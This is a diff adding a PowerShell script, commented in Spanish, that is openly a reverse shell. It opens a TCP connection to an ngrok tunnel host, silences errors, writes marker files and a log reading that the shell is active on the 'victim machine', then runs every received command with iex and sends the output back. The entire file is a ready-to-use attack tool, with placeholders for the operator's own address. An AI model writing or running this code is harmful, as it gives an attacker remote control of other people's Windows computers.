@@ -1,0 +1,34 @@
+# Configuración de la Reverse Shell
+$ip = "4.tcp.eu.ngrok.io"  # Cambia por tu dirección
+$port = 12146              # Cambia por tu puerto
+$ErrorActionPreference = "SilentlyContinue"
+
+# Establecer la Reverse Shell
+$x = (New-Object net.sockets.tcpclient($ip, $port)).getstream();
+[byte[]]$b = 0..65535 | % {0};
+
+# Bandera para ejecutar comandos automatizados
+$executed = $false;
+
+while (($i = $x.read($b, 0, $b.Length)) -ne 0) {
+    if (-not $executed) {
+        try {
+            # Comando 1: Crear archivo en el escritorio
+            Add-Content -Path "$env:USERPROFILE\Desktop\test.txt" -Value "Este archivo fue creado automáticamente." | Out-Null
+            # Comando 2: Crear carpeta
+            New-Item -Path "$env:USERPROFILE\Desktop\CarpetaAutomatica" -ItemType Directory | Out-Null
+            # Comando 3: Crear log en Documentos
+            Add-Content -Path "$env:USERPROFILE\Documents\log.txt" -Value "Shell activa en la máquina víctima." | Out-Null
+        } catch {
+            Add-Content -Path "$env:USERPROFILE\Documents\error_log.txt" -Value "Error ejecutando comandos automatizados." | Out-Null
+        }
+        $executed = $true;
+    }
+
+    # Continuar con la interacción de la shell
+    $d = ([system.text.encoding]::getencoding(20127)).getbytes(
+        ((iex ((New-Object -t text.asciiencoding).getstring($b, 0, $i)) 2>&1 | out-string) + (pwd).path + "> ")
+    );
+    $x.write($d, 0, $d.Length);
+    $x.flush();
+}
